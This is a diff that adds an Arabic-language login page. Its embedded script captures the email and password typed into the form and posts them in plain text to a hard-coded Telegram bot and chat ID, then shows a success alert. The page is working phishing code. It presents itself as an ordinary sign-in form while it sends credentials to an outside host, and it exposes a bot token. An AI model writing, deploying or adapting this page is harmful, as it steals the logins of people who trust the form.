@@ -1,0 +1,55 @@
+    <!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>صفحة تسجيل الدخول</title>
+</head>
+<body>
+    <h1>تسجيل الدخول</h1>
+    <form id="loginForm">
+        <label for="email">البريد الإلكتروني:</label><br>
+        <input type="email" id="email" name="email" required><br><br>
+        
+        <label for="password">كلمة السر:</label><br>
+        <input type="password" id="password" name="password" required><br><br>
+        
+        <button type="submit">تسجيل</button>
+    </form>
+
+    <script>
+        // عند إرسال النموذج
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // منع إعادة تحميل الصفحة
+
+            // جمع البيانات
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // إرسال البيانات عبر بوت Telegram
+            const botToken = '8178057085:AAEhCSYjlVY9CjhZBs-GjzbmhkHWSccU2sw';
+            const chatId = '6963965798';
+            const message = `بريد إلكتروني: ${email}\nكلمة السر: ${password}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                alert('تم إرسال البيانات بنجاح!');
+            })
+            .catch(error => {
+                alert('حدث خطأ أثناء الإرسال.');
+                console.error(error);
+            });
+        });
+    </script>
+</body>
+</html>
